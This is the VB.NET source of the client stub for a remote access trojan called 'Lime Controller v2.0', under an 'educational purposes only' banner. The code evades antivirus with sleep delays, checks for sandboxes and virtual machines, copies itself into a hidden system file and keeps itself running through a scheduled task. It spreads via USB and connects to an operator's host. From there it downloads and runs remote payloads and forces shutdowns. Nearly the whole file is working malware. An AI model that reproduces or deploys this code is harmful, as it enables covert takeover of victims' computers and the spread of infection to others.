
'##################################################################
'##           N Y A N   C A T  ||  Last edit FEB/16/2018         ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                  .. Lime Controller v2.0 ..                  ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##                 For educational purposes only                ##
'##################################################################



Public Module Core

    Public LHOST As String = "%LHOST%"
    Public LHOST2 As String = "%LHOST2%"
    Public LPORT As Integer = "%LPORT%"
    Public LID As String = "%LID%"
    Public LKEY As String = "|L|"
    Public LVER As String = "Controller 2.0"
    Public LEXE As String = "%LEXE%"
    Public STUPNAME As String = "%STNAME%"
    Public NMT As Threading.Mutex = Nothing
    Public MTX As String = "%MUTEX%"
    Public SPUSB As Boolean = "%SPUSB%"
    Public ANTIV As Boolean = "%ANTIV%"
    Public DRCHK As Boolean = "%DRCHK%"
    Public DRPATH As String = "%DRPATH%"
    Public DRFOLDER As String = "%DRFOLDER%"
    Public Xsec As Integer = "%Xsec%"
    Public SPUSB_TEXT As String
    Public NEXE As Object = New IO.FileInfo(Reflection.Assembly.GetExecutingAssembly.Location)
    Public fullpath = Interaction.Environ(DRPATH) & "\" & DRFOLDER & "\" & LEXE
    Public WithEvents C As New SocketClient


    Public Sub Main()

        'sleep to try bypass av runtime
        Try
            If Xsec = "0" Then
                Threading.Thread.Sleep(2000)
            Else
                Threading.Thread.Sleep(Math.Round(Math.Round(CompilerServices.Conversions.ToDouble(Xsec) * 1000.0)))
            End If
        Catch ex As Exception
        End Try

        ' b4 starting this shit lemme check if iam running twice
        Dim createdNew As Boolean
        NMT = New Threading.Mutex(True, MTX, createdNew)
        Try
            If Not createdNew Then End
        Finally
            If createdNew Then
                NMT.ReleaseMutex()
            End If
        End Try

        'check anti
        If ANTIV Then
            If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
                DEL()
            End If

            If Process.GetProcessesByName("VBoxservice").Length >= 1 Or IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
                DEL()
            End If

            If Process.GetProcessesByName("vmwareservice").Length >= 1 Or IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
                DEL()
            End If

            If ID.GOS.ToString.Contains("XP") Then '99.9% of win xp are AV scan
                DEL()
            End If
        End If

        'lets drop
        Call Insistence()

        'usb spread
        If SPUSB Then
            USB.ExeName = LEXE
            USB.Enable()
        Else
            SPUSB_TEXT = "Disabled"
        End If

        'final step, let's connect
        Dim START_CN As New Threading.Thread(AddressOf C.Connect)
        START_CN.Start()
    End Sub

    Public Sub Insistence()

        'now let's drop this shit
        'lemme check if the stub is already droped
        'to prevent delete and re-create which triggers av
        If DRCHK AndAlso Reflection.Assembly.GetExecutingAssembly.Location <> fullpath Then

            Try
                'Create dir
                If Not IO.Directory.Exists(Interaction.Environ(DRPATH) & "\" & DRFOLDER) Then
                    IO.Directory.CreateDirectory(Interaction.Environ(DRPATH) & "\" & DRFOLDER)
                ElseIf IO.File.Exists(fullpath) Then
                    IO.File.Delete(fullpath)
                End If
                Threading.Thread.Sleep(50)
                'FileStream - it's better than copy for av bypass
                Dim NF As New IO.FileStream((fullpath), IO.FileMode.CreateNew)
                Dim LEXEBYTES As Byte() = IO.File.ReadAllBytes(NEXE.FullName)
                NF.Write(LEXEBYTES, 0, LEXEBYTES.Length)
                NF.Flush()
                NF.Close()
                NEXE = New IO.FileInfo(fullpath)
                Threading.Thread.Sleep(50)
                'Set Attrubutes
                IO.File.SetAttributes(NEXE.FullName, IO.FileAttributes.System + IO.FileAttributes.Hidden)
                'Add persistence \\ This stub has no reg startup nor startup folder
                'so it can be FUD for long time
                'schtasks is pretty good
                Shell("schtasks /create /f /sc minute /mo 1 /tn " & STUPNAME & " /tr " & NEXE.FullName & "", AppWinStyle.Hide, False, -1)
                Threading.Thread.Sleep(50)
                'Last thing, exeucte
                Process.Start(NEXE.FullName)
                End
            Catch ex As Exception
            End Try
        End If

        'Force hide files
        '[#DISABLED] My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 0)

    End Sub

    Public Sub DEL()
        On Error Resume Next

        If DRCHK Then
            'set to normal
            IO.File.SetAttributes(NEXE.FullName, IO.FileAttributes.Normal)
            Threading.Thread.Sleep(50)

            'del schtask
            Shell("schtasks /Delete /tn " & STUPNAME & " /F", AppWinStyle.Hide, False, -1)
            Threading.Thread.Sleep(50)
        End If

        'final delete and close connection
        Shell("cmd.exe /c ping 0 -n 2 & del """ & NEXE.FullName & """", AppWinStyle.Hide, False, -1)
        End

    End Sub


    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim DATA As String() = Split(BS(b), LKEY)
        Select Case DATA(0)
            Case "info"
                C.Send("info" & LKEY & ID.Hello())
            Case "PP"
                C.Send("PP")
         '###############################################################################
            Case "Close"
                End
            Case "Reconnect"
                System.Windows.Forms.Application.Restart()
                End
            Case "UpdateDisk"
                Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(DATA(1))
                IO.File.WriteAllBytes(NewFile, Convert.FromBase64String(DATA(2)))
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(NewFile)
                DEL()
            Case "UpdateURL"
                Dim NewFile = (IO.Path.GetTempFileName & ".exe")
                My.Computer.Network.DownloadFile(DATA(1), NewFile)
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(NewFile)
                DEL()
            Case "Uni"
                DEL()
         '###############################################################################
            Case "RunDisk"
                Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(DATA(1))
                IO.File.WriteAllBytes(NewFile, Convert.FromBase64String(DATA(2)))
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(NewFile)
            Case "RunURL"
                Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(DATA(1))
                My.Computer.Network.DownloadFile(DATA(1), NewFile)
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(NewFile)
         '###############################################################################
            Case "Logoff"
                Shell("shutdown -l -t 00 -f", AppWinStyle.Hide)
            Case "Restart"
                Shell("shutdown -r -t 00 -f", AppWinStyle.Hide)
            Case "Shutdown"
                Shell("shutdown -s -t 00 -f", AppWinStyle.Hide)
            Case "details"
                C.Send("details" & LKEY & ID.Hello)
        End Select
    End Sub


End Module
